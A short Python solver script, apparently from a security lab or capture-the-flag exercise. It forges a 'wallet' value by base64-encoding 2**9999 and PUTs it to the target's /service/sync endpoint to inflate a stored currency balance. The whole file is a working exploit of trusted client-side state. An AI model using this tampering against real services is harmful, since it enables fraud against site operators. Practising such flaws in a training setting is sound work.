import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session

import base64

BASE_URL = "https://relax.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def quoccabucks_to_wallet_value(self, quoccabucks: int) -> str:
        num_bytes = (quoccabucks.bit_length() + 7) // 8 or 1
        quoccabucks_bytes = quoccabucks.to_bytes(num_bytes)
        base64_encoded = base64.b64encode(quoccabucks_bytes)
        return base64_encoded.decode()

    def main(self):
        value = self.quoccabucks_to_wallet_value(2 ** 9999)
        print(value)

        self.session.put(
            f"{BASE_URL}/service/sync",
            json={"key": "wallet", "value": value},
        )

if __name__ == "__main__":
    Solver().main()